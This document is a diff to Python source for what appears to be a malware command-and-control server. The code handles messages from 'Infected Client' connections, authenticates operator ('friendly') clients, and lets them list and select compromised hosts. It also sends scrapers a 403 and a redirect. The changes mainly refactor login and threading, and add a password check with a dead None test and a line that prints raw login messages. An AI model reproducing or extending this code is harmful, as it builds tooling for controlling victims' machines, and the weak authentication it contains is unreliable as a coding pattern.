@@ -137,22 +137,26 @@ class ServerSockHandler:
             ## == Decisions based on parsed messages
             if self.client_type == "!_userlogin_!":
                 try:
-                    username, password = self.message.split("//|\\\\")
+                    print(self.message)
+                    username = self.id
+                    password = self.message
+
                 except ValueError as e:
                     username = None
                     password = None
-                    logging.debug("Value error with login, credentials probably passed wrong")
+                    logging.debug(f"Value error with login, credentials probably passed wrong: {e}")
                     
-                except:
+                except Exception as e:
                     username = None
                     password = None
-                    logging.debug("Unkown error with logon process")
+                    logging.debug(f"Unkown error with logon process: {e}")
+                
+                friendly_client_name = f"!!~{username}"
 
                 if self.password_eval(password):
                     try:
                     ##== sending the a-ok on successful authentication
                         self.conn.send(str_encode("0"))
-                        friendly_client_name = f"!!~{username}"
 
                         logging.debug(f"Successful Logon from: {friendly_client_name}")
 
@@ -160,14 +164,14 @@ class ServerSockHandler:
                             self.friendly_current_clients.append(friendly_client_name)
 
                         ## Addinng the class instance with the value of friendly_client_name
-                        ## to the globals so it can be called upon by name
-                        self.friendly_clients[friendly_client_name] = s_friendlyclient()
+                        ## to the globals so it can be called upon by name, and adding in the connection + addr
+                        self.friendly_clients[friendly_client_name] = ServerFriendlyClientHandler(self.conn, self.ADDR)
                         globals()[friendly_client_name] = self.friendly_clients[friendly_client_name]              
 
                     ## == Thread handler
                         friendly_thread = threading.Thread(
                             target=self.friendly_clients[friendly_client_name].friendly_client_communication,
-                            args=(self.conn, self.ADDR, self.response, username)
+                            args=(self.response, username)
                         )
                         friendly_thread.start()
                         logging.debug(f"Thread for object {friendly_client_name} created")
@@ -179,6 +183,20 @@ class ServerSockHandler:
                 else:
                     self.conn.send(str_encode("1"))
                     logging.critical(f"Failed logon  from {username}, {self.client_remote_ip_port}")
+
+                '''
+                ## NOT NEEDED (for now)as the thread created after login handles all incoming
+                commands - I forgot it did that lol
+            elif self.client_type == "!_clientcommand_!":
+                print("Client Command")
+                #pass
+                ##check if user is actually authenticated, if not, quit
+
+                ##then
+
+                ##friendlyclientinstance interact
+                self.friendly_clients[friendly_client_name].friendly_client_communication(self.id, self.message)'''
+                
 ##====================================== Construction ===========
             elif self.client_type == "!_client_!":
                 logging.debug(f"Message from Infected Client {self.id} recieved")
@@ -202,7 +220,7 @@ class ServerSockHandler:
 ##====================================== Construction ^^^^ ===========
                
 
-            if any(method in self.client_type for method in ["GET", "HEAD", "POST", "INFO", "TRACE"]): ## sends a 403 denied via web browser/for scrapers
+            elif any(method in self.client_type for method in ["GET", "HEAD", "POST", "INFO", "TRACE"]): ## sends a 403 denied via web browser/for scrapers
                 ## I should capture these too and see whos hitting it
                 #self.conn.send(str_encode("<p1>403 Forbidden</p1>"))
                 ## Sneaky redirect to youtube 
@@ -213,10 +231,19 @@ class ServerSockHandler:
 
     def password_eval(self, password=None) -> bool:
         ## decrypt pass
-        if password == self.server_password:
-            return True
+
+        _password = str(password)
+
+        if _password == None:
+            logging.debug("Password with value of 'None' passed to the password eval function")
+        
+        ## the else covers my ass for any potential injection/rifraff with the None parameter
         else:
-            return False
+            if _password == self.server_password:
+                return True
+            else:
+                return False
+
 ################
 ## Friendly client
 ################ 
@@ -225,26 +252,23 @@ class ServerFriendlyClientHandler:
     Desc:  This class is called on a per friendly client basis, and handles/stores all the data needed
     for each respective client.
     """
-    def __init__(self):
+    def __init__(self, conn, addr):
         ## Init variables so error messages don't error out if called b4 they are assigned :)
-        self.conn = None
-        self.add = None
-        self.ip = None
-        self.port = None
+        self.conn = conn
+        self.addr = addr
+        self.ip = self.addr[0]
+        self.port = self.addr[1]
         self.current_client_list = None
+        self.authenticated = None
 
         self.Sx21 = f"[Friendly Client: {self.ip}:{self.port}] conn_broken_pipe: A pipe was broken f"
 
     
-    def friendly_client_communication(self, conn, addr, message, username):
+    def friendly_client_communication(self, message, username):
         """
-        Note: Arguments are passed here instead of the __init__ to save a line in ServerSockHandler,
-        plus it's less complicated to my head
+        aaaaa
         """
-        self.conn = conn
-        self.addr = addr
-        self.ip = addr[0]
-        self.port = addr[1]
+
         logging.debug(f"Friendly Client authenticated, user={username}")
 
         while True:
@@ -256,8 +280,8 @@ class ServerFriendlyClientHandler:
                 user_command= user_input[1]
                 self.server_decision_tree(user_command)
 
-            except:
-                logging.debug(f"Error with username or command, input={raw_user_input}")
+            except Exception as e:
+                logging.debug(f"Error with username or command, input={raw_user_input}: {e}")
 
     def server_decision_tree(self, message):
         """
@@ -267,7 +291,7 @@ class ServerFriendlyClientHandler:
 
         if message == "clients":
             if self.current_client_list != "":
-                self.send_msg(self.current_clientlist)
+                self.send_msg(self.current_client_list)
                 ##== these can generate a lot of  messages very quickly, leaving disabled for now
                 #logging.debug(f"[] Current Clients: {self.current_client_list}")
             else:
@@ -323,7 +347,7 @@ class ServerFriendlyClientHandler:
 
 
         self.client = globals()[client_name]
-        if client_name in self.current_clientlist:
+        if client_name in self.current_client_list:
             pass
         else:
             logging.debug(f"[Server] Client {self.client} not found")
